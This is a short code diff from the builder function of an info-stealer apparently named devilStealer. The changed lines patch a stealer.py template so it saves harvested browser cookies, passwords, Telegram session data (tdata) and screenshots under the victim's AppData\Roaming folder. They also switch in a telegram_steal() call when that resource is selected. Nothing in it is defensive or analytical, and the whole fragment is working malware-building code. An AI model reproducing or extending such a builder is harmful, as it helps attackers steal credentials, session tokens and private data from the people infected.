@@ -221,11 +221,11 @@ def buildStealer():
 
     with open(r"devilStealer\stealer.py", "r", encoding='utf-8') as file:
         code = file.readlines()
-        code[14] = f"FILE_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming\{filename}\"" + "\n"
-        code[15] = f"FILE_COOKIE = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming\{filename}\cookie\"" + "\n"
-        code[16] = f"FILE_PASSWORDS = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming\{filename}\passwords\"" + "\n"
-        code[17] = f"FILE_TG = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming\{filename}\\tdata\"" "\n"
-        code[18] = f"SCREENSHOT_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming\{filename}\screenshot.jpg\"" + "\n"
+        code[14] = "FILE_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\"" + "\n"
+        code[15] = "FILE_COOKIE = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\cookie\"" + "\n"
+        code[16] = "FILE_PASSWORDS = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\passwords\"" + "\n"
+        code[17] = "FILE_TG = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\\tdata\"" "\n"
+        code[18] = "SCREENSHOT_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\screenshot.jpg\"" + "\n"
 
         if stealResources[0] == True: code[499] = "    telegram_steal()" + "\n"
         if stealResources[0] == False: code[499] = "\n"
